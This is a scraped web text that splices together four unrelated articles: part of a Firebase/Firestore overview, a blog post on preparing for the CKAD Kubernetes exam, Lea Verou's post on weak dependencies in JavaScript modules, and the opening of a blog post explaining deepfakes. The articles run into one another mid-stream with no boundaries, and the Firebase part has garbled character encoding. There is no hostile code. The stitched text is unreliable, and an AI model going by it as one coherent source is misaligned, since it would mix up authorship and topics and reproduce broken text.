previously, you can do so again without the Internet connection. You can even save the data there without active connection. Firestore libraries handle all the syncing, data merging, notifications and other problems.<br></p><h2><strong>You donâ€™t need backendâ€¦ sometimes<br></strong></h2><p><strong>Firebase platform (that Firestore is part of) might be a viable â€œbackendâ€� option for small, user-focused apps.</strong> If you use it alongside other SaaS solutions (e-mails, voice calls, etc.), you might be even able to build a not-so-small app without creating any traditional backend system.<br></p><p><img src="https://prismic-io.s3.amazonaws.com/leancodelanding2/0b913bc2-d221-491b-9f35-c4503a14c2bc_qwerty.png"></p><h4><strong><br>Firebase suite provides you with:</strong></h4><ol><li>Auth - Firebase Auth.</li><li>Storage - Firebase Cloud Storage.</li><li>Serverless - Firebase Cloud Functions.</li><li>Basic machine learning - Firebase ML.</li><li>A/B tests &amp; user-scoped configuration - Firebase Remote Configuration.</li><li>App distribution &amp; monitoring - Firebase App Distribution &amp; Crashlytics.</li><li>Many, many more.</li></ol><p><strong>Being Googleâ€™s product, it also integrates well with GCP.</strong> It blends with it more and more with every release and I suppose that soon, these two will be fully merged.</p><p>Having all these solutions in a single place, governed by the same IAM services and configured the same gives you a great advantage right at the beginning. It allows you to focus on what matters, leaving all the gritty details to Firebase. Even if you end up needing some more advanced backend features, you can always use <strong>Cloud Functions</strong> and do it the <em>normal way</em>.</p></div></div></div></section><section><div><div><div><div><p><img alt="" src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNzUiIGhlaWdodD0iMzgiIHZpZXdCb3g9IjAgMCA3NSAzOCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48cGF0aCBkPSJNNC4wODcgMzhMMCAzMy45NTEgMTQuODUgMTkuMDMgMCA0LjEwNyA0LjA4NyAwbDE4Ljg4IDE5LjAyOUw0LjA4NiAzOHptMjUuOTU5IDBsLTQuMDMtNC4wNDlMNDAuODY4IDE5LjAzIDI2LjAxNyA0LjEwNyAzMC4wNDcgMGwxOC45MzYgMTkuMDI5TDMwLjA0NiAzOHptMjYuMDE3IDBsLTQuMDg3LTQuMDQ5IDE0Ljg1LTE0LjkyMi0xNC44NS0xNC45MjJMNTYuMDYzIDAgNzUgMTkuMDI5IDU2LjA2MyAzOHoiIGZpbGw9IiMwMDAiLz48L3N2Zz4="></p></div></div><div><h2><strong>Examples</strong></h2><p><br>Firestore is great for many things.

Where Firestore shines and simplifies things at the beginning, it can make your hair gray after the application gets complicated enough. As everything in programming - you need to wage pros and cons, consider the future and select what is best for your app. </p></div></div></div></section><section><div><div><div><div><p><img alt="" src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzA0IiBoZWlnaHQ9IjE4OCIgdmlld0JveD0iMCAwIDMwNCAxODgiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PHBhdGggZD0iTTI5Ny4yNTkgMTMuNDQzYzMuNzIzIDAgNi43NDEtMy4wMSA2Ljc0MS02LjcyMkMzMDQgMy4wMSAzMDAuOTgyIDAgMjk3LjI1OSAwYy0zLjcyMiAwLTYuNzQgMy4wMS02Ljc0IDYuNzIxIDAgMy43MTIgMy4wMTggNi43MjIgNi43NCA2LjcyMnptMCA1Ny45NDVjMy43MjMgMCA2Ljc0MS0zLjAwOSA2Ljc0MS02LjcyIDAtMy43MTMtMy4wMTgtNi43MjItNi43NDEtNi43MjItMy43MjIgMC02Ljc0IDMuMDEtNi43NCA2LjcyMSAwIDMuNzEyIDMuMDE4IDYuNzIxIDYuNzQgNi43MjF6bTAgNTcuOTI1YzMuNzIzIDAgNi43NDEtMy4wMDkgNi43NDEtNi43MjFzLTMuMDE4LTYuNzIxLTYuNzQxLTYuNzIxYy0zLjcyMiAwLTYuNzQgMy4wMDktNi43NCA2LjcyMXMzLjAxOCA2LjcyMSA2Ljc0IDYuNzIxem0wIDU3Ljk0NmMzLjcyMyAwIDYuNzQxLTMuMDA5IDYuNzQxLTYuNzIxcy0zLjAxOC02LjcyMS02Ljc0MS02LjcyMWMtMy43MjIgMC02Ljc0IDMuMDA5LTYuNzQgNi43MjFzMy4wMTggNi43MjEgNi43NCA2LjcyMXpNMjM5LjE0NyAxMy40NDNjLTMuNzMgMC02Ljc0MS0zLjAwMi02Ljc0MS02LjcyMiAwLTMuNzIgMy4wMTEtNi43MjEgNi43NDEtNi43MjEgMy43MyAwIDYuNzQxIDMuMDAyIDYuNzQxIDYuNzIxLjAyMSAzLjcyLTMuMDExIDYuNzIyLTYuNzQxIDYuNzIyem0wIDU3Ljk0NWMtMy43MyAwLTYuNzQxLTMuMDAxLTYuNzQxLTYuNzIgMC0zLjcyIDMuMDExLTYuNzIyIDYuNzQxLTYuNzIyIDMuNzMgMCA2Ljc0MSAzLjAwMiA2Ljc0MSA2LjcyMS4wMjEgMy42OTgtMy4wMTEgNi43MjEtNi43NDEgNi43MjF6bTAgNTcuOTI1Yy0zLjczIDAtNi43NDEtMy4wMDItNi43NDEtNi43MjEgMC0zLjcyIDMuMDExLTYuNzIxIDYuNzQxLTYuNzIxIDMuNzMgMCA2Ljc0MSAzLjAwMSA2Ljc0MSA2LjcyMSAwIDMuNzE5LTMuMDExIDYuNzIxLTYuNzQxIDYuNzIxem0wIDU3Ljk0NmMtMy43MyAwLTYuNzQxLTMuMDAyLTYuNzQxLTYuNzIxIDAtMy43MiAzLjAxMS02LjcyMSA2Ljc0MS02LjcyMSAzLjczIDAgNi43NDEgMy4wMDEgNi43NDEgNi43MjEuMDIxIDMuNzE5LTMuMDExIDYuNzIxLTYuNzQxIDYuNzIxek0xODEuMDU2IDEzLjQ0M2MzLjcyMyAwIDYuNzQxLTMuMDEgNi43NDEtNi43MjIgMC0zLjcxMi0zLjAxOC02LjcyMS02Ljc0MS02LjcyMS0zLjcyMiAwLTYuNzQgMy4wMS02Ljc0IDYuNzIxIDAgMy43MTIgMy4wMTggNi43MjIgNi43NCA2LjcyMnptMCA1Ny45NDVjMy43MjMgMCA2Ljc0MS0zLjAwOSA2Ljc0MS02LjcyIDAtMy43MTMtMy4wMTgtNi43MjItNi43NDEtNi43MjItMy43MjIgMC02Ljc0IDMuMDEtNi43NCA2LjcyMSAwIDMuNzEyIDMuMDE4IDYuNzIxIDYuNzQgNi43MjF6bTAgNTcuOTI1YzMuNzIzIDAgNi43NDEtMy4wMDkgNi43NDEtNi43MjFzLTMuMDE4LTYuNzIxLTYuNzQxLTYuNzIxYy0zLjcyMiAwLTYuNzQgMy4wMDktNi43NCA2LjcyMXMzLjAxOCA2LjcyMSA2Ljc0IDYuNzIxem0wIDU3Ljk0NmMzLjcyMyAwIDYuNzQxLTMuMDA5IDYuNzQxLTYuNzIxcy0zLjAxOC02LjcyMS02Ljc0MS02LjcyMWMtMy43MjIgMC02Ljc0IDMuMDA5LTYuNzQgNi43MjFzMy4wMTggNi43MjEgNi43NCA2LjcyMXpNMTIyLjk0NCAxMy40NDNjMy43MjIgMCA2Ljc0LTMuMDEgNi43NC02LjcyMiAwLTMuNzEyLTMuMDE4LTYuNzIxLTYuNzQtNi43MjEtMy43MjMgMC02Ljc0MSAzLjAxLTYuNzQxIDYuNzIxIDAgMy43MTIgMy4wMTggNi43MjIgNi43NDEgNi43MjJ6bTAgNTcuOTQ1YzMuNzIyIDAgNi43NC0zLjAwOSA2Ljc0LTYuNzIgMC0zLjcxMy0zLjAxOC02LjcyMi02Ljc0LTYuNzIyLTMuNzIzIDAtNi43NDEgMy4wMS02Ljc0MSA2LjcyMSAwIDMuNzEyIDMuMDE4IDYuNzIxIDYuNzQxIDYuNzIxem0wIDU3LjkyNWMzLjcyMiAwIDYuNzQtMy4wMDkgNi43NC02LjcyMXMtMy4wMTgtNi43MjEtNi43NC02LjcyMWMtMy43MjMgMC02Ljc0MSAzLjAwOS02Ljc0MSA2LjcyMXMzLjAxOCA2LjcyMSA2Ljc0MSA2LjcyMXptMCA1Ny45NDZjMy43MjIgMCA2Ljc0LTMuMDA5IDYuNzQtNi43MjFzLTMuMDE4LTYuNzIxLTYuNzQtNi43MjFjLTMuNzIzIDAtNi43NDEgMy4wMDktNi43NDEgNi43MjFzMy4wMTggNi43MjEgNi43NDEgNi43MjF6TTY0Ljg1MyAxMy40NDNjMy43MjMgMCA2Ljc0LTMuMDEgNi43NC02LjcyMkM3MS41OTQgMy4wMSA2OC41NzcgMCA2NC44NTQgMHMtNi43NCAzLjAxLTYuNzQgNi43MjFjMCAzLjcxMiAzLjAxNyA2LjcyMiA2Ljc0IDYuNzIyem0wIDU3Ljk0NWMzLjcyMyAwIDYuNzQtMy4wMDkgNi43NC02LjcyIDAtMy43MTMtMy4wMTctNi43MjItNi43NC02LjcyMi0zLjcyMyAwLTYuNzQgMy4wMS02Ljc0IDYuNzIxIDAgMy43MTIgMy4wMTcgNi43MjEgNi43NCA2LjcyMXptMCA1Ny45MjVjMy43MjMgMCA2Ljc0LTMuMDA5IDYuNzQtNi43MjFzLTMuMDE3LTYuNzIxLTYuNzQtNi43MjFjLTMuNzIzIDAtNi43NCAzLjAwOS02Ljc0IDYuNzIxczMuMDE3IDYuNzIxIDYuNzQgNi43MjF6bTAgNTcuOTQ2YzMuNzIzIDAgNi43NC0zLjAwOSA2Ljc0LTYuNzIxcy0zLjAxNy02LjcyMS02Ljc0LTYuNzIxYy0zLjcyMyAwLTYuNzQgMy4wMDktNi43NCA2LjcyMXMzLjAxNyA2LjcyMSA2Ljc0IDYuNzIxek02Ljc0IDEzLjQ0M2MzLjcyMyAwIDYuNzQxLTMuMDEgNi43NDEtNi43MjJDMTMuNDgxIDMuMDEgMTAuNDYzIDAgNi43NDEgMCAzLjAxOCAwIDAgMy4wMSAwIDYuNzIxYzAgMy43MTIgMy4wMTggNi43MjIgNi43NCA2LjcyMnptMCA1Ny45NDVjMy43MjMgMCA2Ljc0MS0zLjAwOSA2Ljc0MS02LjcyIDAtMy43MTMtMy4wMTgtNi43MjItNi43NC02LjcyMi0zLjcyMyAwLTYuNzQxIDMuMDEtNi43NDEgNi43MjEgMCAzLjcxMiAzLjAxOCA2LjcyMSA2Ljc0IDYuNzIxem0wIDU3LjkyNWMzLjcyMyAwIDYuNzQxLTMuMDA5IDYuNzQxLTYuNzIxcy0zLjAxOC02LjcyMS02Ljc0LTYuNzIxYy0zLjcyMyAwLTYuNzQxIDMuMDA5LTYuNzQxIDYuNzIxczMuMDE4IDYuNzIxIDYuNzQgNi43MjF6bTAgNTcuOTQ2YzMuNzIzIDAgNi43NDEtMy4wMDkgNi43NDEtNi43MjFzLTMuMDE4LTYuNzIxLTYuNzQtNi43MjFjLTMuNzIzIDAtNi43NDEgMy4wMDktNi43NDEgNi43MjFzMy4wMTggNi43MjEgNi43NCA2LjcyMXoiIGZpbGw9IiNDQ0MiLz48L3N2Zz4="></p></div></div><div><p>Do you want to find out how the Firestore pricing works or what traps wait for you if you want to properly secure it?

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>In this article, I will be describing my experience preparing for and taking the CKAD exam. A little bit about my background to relate with if you’re also on the same boat as I was: I am primarily a Software Developer; I’ve used mostly Python and Go. I have some experience in shell scripting and nearly negligible experience in DevOps.</p>
<p>First, we’ll spell out what the Certified Kubernetes Application Developer exam is. According to <a href="https://www.cncf.io/certification/ckad/" target="_blank" rel="noopener">the CNCF website</a>:</p>
<blockquote><p>“The Certified Kubernetes Application Developer exam certifies that users can design, build, configure, and expose cloud-native applications for Kubernetes.” </p><cite><a href="https://www.cncf.io/certification/ckad/" target="_blank" rel="noopener">CNCF</a></cite></blockquote>
<p>I recommend going through the CNCF website to understand the curriculum, exam tips, and other FAQs.</p>
<p>We’ll now dig into what it took me, an absolute beginner to DevOps, to prepare for the CKAD exam.</p>
<p>There are a few fundamental prerequisites such as Linux know-how, YAML configuration, Docker, etc., that one must know before proceeding to the Kubernetes world. I find the <a href="https://kodekloud.com/p/learning-path" target="_blank" rel="noopener">learning path</a> recommended on the <a href="https://kodekloud.com/courses/" target="_blank" rel="noopener">KodeKloud</a> website to be especially helpful to plan the order of learning the prerequisites.</p>
<h2>Certified Kubernetes Application Developer materials and courses</h2>

<p>I did the following courses offered by KodeKloud (this is most definitely not a plug for KodeKloud, you may learn all of these from other sources if you wish) in the order listed below.</p>
<p><strong>Linux </strong>– <strong>The Linux Basics Course</strong>. This course might not be necessary for everyone. If you’re familiar with the Linux terminal, basic commands, and comfortable using the Linux terminal, then you’re good to go.</p>
<p><strong>Automation</strong> – <strong>Ansible for Beginners.</strong> It is essential to understand how the YAML configuration works and know the data structures used in a YAML file. This course explains all of this and provides exercises for hands-on practising, among other topics.</p>
<p><strong>Docker – Docker for Absolute Beginners, Docker – SWARM | SERVICES | STACKS</strong>. Before jumping directly to Kubernetes, I think it is essential to understand the fundamentals of containers and container-based systems. Learning about the Docker platform is a great way to start with it. Once you are familiar with the basics of Docker, proceed further to learn advanced topics such as Docker Swarm, Services, etc., These courses should provide you with a pretty strong foundation to being learning Kubernetes.</p>
<p><strong>Kubernetes – Kubernetes for the Absolute Beginners, Certified Kubernetes Application Developer</strong>. These courses explain the core concepts in Kubernetes very well. The content of the CKAD course is tailor-made to fit the CKAD exam curriculum. Working through these courses, their practice materials, and mock exam should give one enough idea about the actual exam. I would also like to add that only these courses might not be sufficient to excel in the exam. Find more resources to help you practice.</p>
<p>What I find noteworthy about these courses is that KodeKloud provides a virtual lab to practice what you have learnt right away. Personally, for me, this is a huge plus. If you have only been watching a bunch of videos without getting your hands dirty, then it is not going to be of much use.</p>
<p>Other helpful resources to prepare for the exam:</p>
<ol type="1"><li><a href="https://github.com/dgkanatsios/CKAD-exercises" target="_blank" rel="noopener">https://github.com/dgkanatsios/CKAD-exercises</a> – This is extremely helpful for more practice questions.</li><li>Even more practice – <a href="https://medium.com/bb-tutorials-and-thoughts/practice-enough-with-these-questions-for-the-ckad-exam-2f42d1228552" target="_blank" rel="noopener">https://medium.com/bb-tutorials-and-thoughts/practice-enough-with-these-questions-for-the-ckad-exam-2f42d1228552</a></li></ol>
<h2>Tips for pulling off the Certified Kubernetes Application Developer exam</h2>
<p>There are a few key aspects that will help you with the exam.</p>
<ol type="1"><li><strong>Familiarity</strong> – Familiarize yourself with the exam curriculum, the kubectl command, exporting to a yaml definition file (instead of writing one from scratch), and editing it as needed.</li><li><strong>Practice</strong> – The more you practice, the more familiar you are with the commands and shortcuts you learn along the way. Practising will also help you respond faster.</li><li><strong>Speed</strong> – Speed is particularly crucial to ace the exam. You have about 2 hours to answer 19 questions. And each of these questions may have sub-tasks. Again, at the cost of repeating myself, practice, practice, keep practising!</li><li><strong>Helpful resources during the exam</strong> – You do not have to remember definitions of all the Kubernetes resources. You have access to Kubernetes documentation during the exam to look up any information you want. Besides documentation, you can also use the <strong>‘kubectl explain’</strong> command to look up any resource. Learn how to use the <strong>‘kubectl explain’ </strong>command to your advantage, as this will save you a lot of time.</li><li><strong>Time awareness </strong>– Be aware of the amount of time you spend on each question. Some might require only a couple of minutes, while others require more. Skim through all the questions quickly, make a mental estimate of the time you will have to spend on each of them.</li><li><strong>WiFi – </strong>Ensure that you have seamless internet connectivity to avoid disruptions during your exam.</li><li>Be physically and mentally prepared to sit through the exam for about 2 hours with no break. I know you could take breaks in between, but that will cost you time. So, be prepared.</li></ol>
<p>Ensure that you’re well-rested. Do not stress yourself about the exam as it will only hinder your performance. Even if you do not pass the exam on your first try, you can retake the exam once more. You will have gained insight into the exam expectations, which will surely help you prepare well for your next try. Keep calm and give your best 😊</p>

<p>Earlier today, I was briefly entertaining the idea of writing a library to wrap and enhance querySelectorAll in certain ways. I thought I’d rather not introduce a <a href="http://projects.verou.me/parsel/">Parsel</a> dependency out of the box, but only use it to parse selectors properly when it’s available, and use more crude regex when it’s not (which would cover most use cases for what I wanted to do).</p>



<p>In the olden days, where every library introduced a global, I could just do:</p>



<pre><code>if (window.Parsel) {
	let ast = Parsel.parse();
	// rewrite selector properly, with AST
}
else {
	// crude regex replace
}</code></pre>



<p>However, with ESM, there doesn’t seem to be a way to detect whether a module is imported, without actually importing it yourself.</p>



<p>I <a href="https://twitter.com/LeaVerou/status/1329389035249422336">tweeted</a> about this…</p>



<figure><div>
<blockquote data-width="550" data-dnt="true"><div lang="en" dir="ltr"><p>One issue with ESM (and other module systems) is that you can't have optional dependencies. </p><p>With globals, you could check if a global existed and branch accordingly. With modules, you can't check if a module is available/loaded without importing it from somewhere.</p></div>— Lea Verou (@LeaVerou) <a href="https://twitter.com/LeaVerou/status/1329389035249422336?ref_src=twsrc%5Etfw">November 19, 2020</a></blockquote>
</div></figure>



<p>I thought this was a common paradigm, and everyone would understand why this was useful. However, I was surprised to find that most people were baffled about my use case. Most of them thought I was either talking about conditional imports, or error recovery after failed imports.</p>



<p>I suspect it might be because my primary perspective for writing JS is that of a library author, where I do not control the host environment, whereas for most developers, their primary perspective is that of writing JS for a specific app or website.</p>



<p>After <a href="https://twitter.com/LeaVerou/status/1329389035249422336">Kyle Simpson asked me to elaborate</a> about the use case, I figured a blog post was in order.</p>



<p>The use case is essentially <strong>progressive enhancement</strong> (in fact, I toyed with the idea of titling this blog post <em><strong>“Progressively Enhanced JS”</strong></em>). If library X is loaded already by other code, do a more elaborate thing and cover all the edge cases, otherwise do a more basic thing. It’s for dependencies that are not really <strong>depend</strong>encies, but more like <strong>nice-to-haves</strong>.</p>



<p>We often see modules that do things really well, but use a ton of dependencies and add a lot of weight, even to the simplest of projects, because they need to cater to all the edge cases that we may not care about. We also see modules that are dependency free, but that’s because lots of things are implemented more crudely, or certain features are not there.</p>



<p>This paradigm gives you the best of both worlds: <strong>Dependency free</strong> (or low dependency) modules, that can use what’s available to improve how they do things with <strong>zero additional impact</strong>. </p>



<p>Using this paradigm, the <strong>size of these dependencies is not a concern</strong>, because they are <strong>optional peer dependencies</strong>, so one can pick the best library for the job without being affected by bundle size. Or even use multiple! One does not even need to pick one dependency for each thing, they can support bigger, more complete libraries when they’re available and fall back to micro-libraries when they are not.</p>



<p>Some examples besides the one in the first paragraph:</p>



<ul><li>A Markdown to HTML converter that also syntax highlights blocks of code if <a href="https://prismjs.com/">Prism</a> is present. Or it could even support multiple different highlighters!</li><li>A code editor that uses <a href="https://projects.verou.me/incrementable">Incrementable</a> to make numbers incrementable via arrow keys, if it’s present</li><li>A templating library that also uses <a href="https://bevacqua.github.io/dragula/">Dragula</a> to make items rearrangable via drag &amp; drop, if present</li><li>A testing framework that uses <a href="https://atomiks.github.io/tippyjs/">Tippy</a> for nice informational popups, when it’s available</li><li>A code editor that shows code size (in KB) if a library to measure that is included. Same editor can also show gzipped code size if a gzip library is included.</li><li>A UI library that uses a custom element if it’s available or the closest native one when it’s not (e.g. a fancy date picker vs <code>&lt;input type="date"&gt;</code> ) when it isn’t. Or <a href="https://projects.verou.me/awesomplete/">Awesomplete</a> for autocomplete when it’s available, and fall back to a simple <code>&lt;datalist&gt;</code> when it isn’t.</li><li>Code that uses a date formatting library when one is already loaded, and falls back to <code><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Intl/DateTimeFormat">Intl.DateTimeFormat</a></code> when it’s not.</li></ul>



<p>This pattern can even be <strong>combined with conditional loading</strong>: e.g. we check for all known syntax highlighters and load Prism if none are present.</p>



<p>To recap, some of the <strong>main benefits</strong> are:</p>



<ul><li><strong>Performance:</strong> If you’re loading modules over the network HTTP requests are expensive. If you’re pre-bundling it increases bundle size. Even if code size is not a concern, runtime performance is affected if you take the slow but always correct path when you don’t need it and a more crude approach would satisfice.</li><li><strong>Choice:</strong> Instead of picking one library for the thing you need, you can support multiple. E.g. multiple syntax highlighters, multiple Markdown parsers etc. If a library is always needed to do the thing you want, you can load it conditionally, if none of the ones you support are loaded already.</li></ul>



<h2>Are weak dependencies an antipattern?</h2>



<p>Since this article was posted, some of the feedback I got was along the lines of <em>“Weak dependencies are an antipattern because they are unpredictable. What if you have included a library but don’t want another library to use it? You should instead use parameters to explicitly provide references to these libraries.”</em></p>



<p>There are several counterpoints to make here.</p>



<p>First, if weak dependencies are used well, they are only used to <em>enhance</em> the default/basic behavior, so it’s highly unlikely that you’d want to turn that off and fall back to the default behavior.</p>



<p>Second, weak dependencies and parameter injection are not mutually exclusive. They can work together and complement each other, so that the weak dependencies provide sensible defaults that the parameters can then tweak further (or disable altogether). <em>Only</em> having parameter injection imposes a high upfront cognitive cost for using the library (see <em><a href="https://en.wikipedia.org/wiki/Convention_over_configuration">Convention over Configuration</a></em>). <strong>Good APIs make simple things easy and complex things possible.</strong> The common case is that if you’ve loaded e.g. a syntax highlighter, you’d want to use it to syntax highlight, and if you’ve loaded a parser, you’d prefer it over parsing with regexes. The obscure edge cases where you wouldn’t want to highlight or you want to provide a different parser can still be possible via parameters, but should not be the only way.</p>



<p>Third, the end user-developer may not even be aware of all the libraries that are being loaded, so they may already have a library loaded for a certain task but not know about it. The weak dependencies pattern operates directly on which modules are loaded so it doesn’t suffer from this problem.</p>



<h2>How could this work with ESM?</h2>



<p>Some people (mostly fellow library authors) *did* understand what I was talking about, and expressed some ideas about how this would work.</p>



<p><strong>Idea 1:</strong> A global module loaded cache could be a low-level way to implement this, and something CJS supports out of the box apparently.</p>



<figure><div>
<blockquote data-width="550" data-dnt="true"><p lang="en" dir="ltr">CommonJS exposes the cache … maybe ESM could follow, handy also for cache invalidation and code coverage with tests … indeed my tests are all CommonJS and I *can’t* change that 😔</p>— Andrea Giammarchi 🍥 (@WebReflection) <a href="https://twitter.com/WebReflection/status/1329396560694796290?ref_src=twsrc%5Etfw">November 19, 2020</a></blockquote>
</div></figure>



<p><strong>Idea 2:</strong> A global registry where modules can register themselves on, either with an identifier, or a SHA hash<br><strong>Idea 3:</strong> An <code>import.whenDefined(moduleURL)</code> promise, though that makes it difficult to deal with the module not being present at all, which is the whole point.</p>



<figure><div>
<blockquote data-width="550" data-dnt="true"><div lang="en" dir="ltr"><p>an ugly way could be to:<br>globalThis[Symbol.for(moduleName)] = true;<br>in the main module export/file</p><p>another way I use with uce is to pass through customElements.whenDefined('uce-lib').then(…) so that if nobody imports 'uce' nothing happens</p><p>import.whenDefined(module).then(…)?</p></div>— Andrea Giammarchi 🍥 (@WebReflection) <a href="https://twitter.com/WebReflection/status/1329420308491677696?ref_src=twsrc%5Etfw">November 19, 2020</a></blockquote>
</div></figure>



<figure><div>
<blockquote data-width="550" data-dnt="true"><p lang="en" dir="ltr">If it exported a known SHA. a could be solved</p>— James Campbell (@jcampbell_05) <a href="https://twitter.com/jcampbell_05/status/1329413956474187777?ref_src=twsrc%5Etfw">November 19, 2020</a></blockquote>
</div></figure>



<p><strong>Idea 4:</strong> Monitoring <code>&lt;link rel="modulepreload"&gt;</code>. The problem is that not all modules are loaded this way.</p>



<figure><div>
<blockquote data-width="550" data-dnt="true"><div lang="en" dir="ltr"><p>I had a few things in mind:</p><p>– if the tag is present in the page, you could assume it's either present or will be very soon (already loading), so that might/should be a safe enough signal for your use-case</p><p>– you could also attach a load event handler to the tag to observe it</p></div>— getify (@getify) <a href="https://twitter.com/getify/status/1329407281797222401?ref_src=twsrc%5Etfw">November 19, 2020</a></blockquote>
</div></figure>



<p><strong>Idea 5:</strong> I was thinking of a function like <code>import()</code> that resolves with the module (same as a regular dynamic import) only when the module is already loaded, or rejects when it’s not (which can be caught). In fact, it could even use the same functional notation, with a second argument, like so:</p>



<pre><code>import("https://cool-library", {weak: true});</code></pre>



<p>Nearly all of these proposals suffer from one of the following problems.</p>



<p>Those that are <strong>URL based</strong> mean that only modules loaded from the same URL would be recognized. The same library loaded over a CDN vs locally would not be recognized as the same library. </p>



<p>One way around this is to expose a list of URLs, like the first idea, and allow to listen for changes to it. Then these URLs can be inspected and those which <em><strong>might</strong></em> belong to the module we are looking for can be further inspected by dynamically importing and inspecting their exports (importing already imported modules is a pretty cheap operation, the browser does de-duplicate the request).</p>



<p>Those that are <strong>identifier based</strong>, depend on the module to register itself with an identifier, so only modules that want to be exposed, will be. This is the closest to the old global situation, but would suffer in the transitional period until most modules use it. And of course, there is the potential for clashes. Though the API could take care of that, by essentially using a hashtable and adding all modules that register themselves with the same identifier under the same “bucket”. Code reading the registry would then be responsible for filtering.</p>

<h2 id="introduction">Introduction</h2>

<p>Media manipulation through images and videos has been around for decades. For example, during <a href="https://www.dailymail.co.uk/news/article-4984364/How-Hitler-Mussolini-Lenin-used-photo-editing.html">WWII, Mousollini released a propaganda image</a> of himself on a horse with his horse handler edited out. The goal was to make himself seem more impressive and powerful <sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup>. These types of tricks can have significant impacts given the scale of the audience, especially in the internet era. <a href="https://www.darpa.mil/program/media-forensics">DARPA has constructed an entire program</a> to develop media forensics methods for detecting manipulated media <sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup>.</p>

<p><a href="https://www.theguardian.com/technology/2018/nov/12/deep-fakes-fake-news-truth">Fake news may one day pale in comparison to the impact of deepfake news</a> <sup id="fnref:3" role="doc-noteref"><a href="#fn:3">3</a></sup>. Deepfakes are a set of Computer Vision methods that can create doctored images or videos with uncanny realism. In recent years, they have been blowing up in both quality and popularity. The term deepfake comes from a “fake” image or video generated by a “deep” learning algorithm. You’ve likely seen a video of a movie scene with actors face-swapped with a scary degree of accuracy.</p>

<figure>

    <figcaption>Deepfake of Arnold Schwarzenegger and Silvester Stallone in the movie Step Brothers <a href="https://www.youtube.com/watch?v=uXwmSFjlVc0">(source)</a></figcaption>    
</figure>

<p>This technology has the potential to provide malicious actors with the means to sow unprecedented amounts of disinformation because it is far cheaper and more accessible than traditional special effects techniques used in Hollywood when it comes to creating videos with realistic face-swaps. This is concerning, since fake news is already prevalent and people are all too often believing news with little to no evidence <sup id="fnref:4" role="doc-noteref"><a href="#fn:4">4</a></sup>. Just recently, <a href="https://www.cnn.com/2020/11/01/tech/false-biden-video-twitter/index.html">a deceptively-edited video making it look like Joe Biden didn’t know what state he is in got 1 million views on Twitter</a> <sup id="fnref:5" role="doc-noteref"><a href="#fn:5">5</a></sup>. Deepfakes could provide “evidence” to people who are looking to further their cognitive dissonance around disinformation. This is a real threat, with two bills <a href="https://www.congress.gov/bill/116th-congress/house-bill/3230/text">H. R. 3230</a>,<a href="https://www.congress.gov/bill/115th-congress/senate-bill/3805/text">S. 3805</a> having already been proposed in Congress to counter the spread of deepfakes for illegal purposes.</p>

</figure>

<p>Since the term was coined in 2017, the amount of detected deepfakes on the internet has been increasing exponentially. At the same time, the underlying AI methods to generate deepfakes have improved, as have user-friendly tools that allow one to easily create deepfakes without in-depth technical knowhow. In this blog post, I’m going to go over some background behind deepfakes, what they have been used for, and how to counter them.</p>

<blockquote>
  <p>A deepfake refers to a specific kind of synthetic media where a person in an image or video is swapped with another person’s likeness. -<a href="https://mitsloan.mit.edu/ideas-made-to-matter/deepfakes-explained">Meredith Somers</a></p>
</blockquote>

<p>Synthetic image and video generation have been a growing computer vision subfields, and they got a lot of momentum with the introduction of generative adversarial networks (GAN) in 2014 <sup id="fnref:8" role="doc-noteref"><a href="#fn:8">6</a></sup>. The term “deepfake” was first coined by a Reddit user in 2017 who was using the technology to create fake pornography of celebrities using face swaps <sup id="fnref:10" role="doc-noteref"><a href="#fn:10">7</a></sup>. Since then, the term has evolved to cover a wider range of image and video augmentations and generation as well as some audio applications.</p>

<p>Deepfakes come in a variety of forms according to <a href="https://arxiv.org/pdf/2004.11138.pdf#page=34&amp;zoom=100,65,305">Mirsky and Lee</a> <sup id="fnref:9" role="doc-noteref"><a href="#fn:9">8</a></sup>. Here are examples of different types of deep fakes on a woman’s face:</p>

<h3 id="reenactment">Reenactment</h3>
<p>aka Using your facial or body movements to dictate the movements of another person</p>

<p>Current works in reenactment are looking to minimize the amount of training data that is needed to be able to generate a modified face. One-shot and few-shot learning have become popular approaches to utilize data from many different faces but only need to fine tune on a select few samples of their target face. Some of the leading methods here are <a href="https://arxiv.org/pdf/1911.08139.pdf">MarioNETte</a> and <a href="https://arxiv.org/pdf/1911.09224.pdf">FLNet</a>.</p>

</figure>

<h3 id="replacement">Replacement</h3>
<p>aka Your identity is mapped to another person (for example the face swap filter on Snapchat)</p>

<p>Many replacement works apply either encoder-decoder networks or variational autoencoders to learn to map the source face to the target while retaining the same expressions. Common challenges that come up with replacement is the need to deal with occlusions, when an object passes in front of the target’s face. Recent replacement models include <a href="https://arxiv.org/abs/1912.13457">FaceShifter</a> and <a href="https://github.com/shaoanlu/faceswap-GAN">FaceSwap-GAN</a>.</p>

<p>Reenactment and replacement are the two most prominent types of deepfakes, since they have the highest potential for destructive applications. For example, the face of a politician could be reenacted to say something they never actually said, or a person’s face could be replaced into an incriminating video for blackmail purposes. These types of manipulated media (deepfake or not) can be incriminating and/or harmful to the target’s reputation, like the <a href="https://www.cnn.com/2020/11/01/tech/false-biden-video-twitter/index.html">post of Biden mentioned earlier</a> in which signs that said the name of the state were edited to make it look like he didn’t know where he was.</p>

<p>At the core of the concern about deepfakes is the fact that they make reenactment and replacement accessible and cheap; you don’t have to understand the details of the techniques involved to be able to create deepfakes. Tools like <a href="https://github.com/iperov/DeepFaceLab">DeepFaceLab</a> allow anyone to take an image or video and replace a face, de-age a face, or manipulate a speech. For really seamless deepfakes, tools like this will provide a high quality generation of a face, but you still need some experience in video editing software like Adobe After Effects to add them to a video. If you don’t have the desire or ability to make them yourself, you can even find services and marketplaces willing to create deepfakes for you. One example is <a href="https://deepfakesweb.com/">https://deepfakesweb.com/</a> where you just have to upload videos and images you want, and they will create a deepfake for you in the cloud.</p>

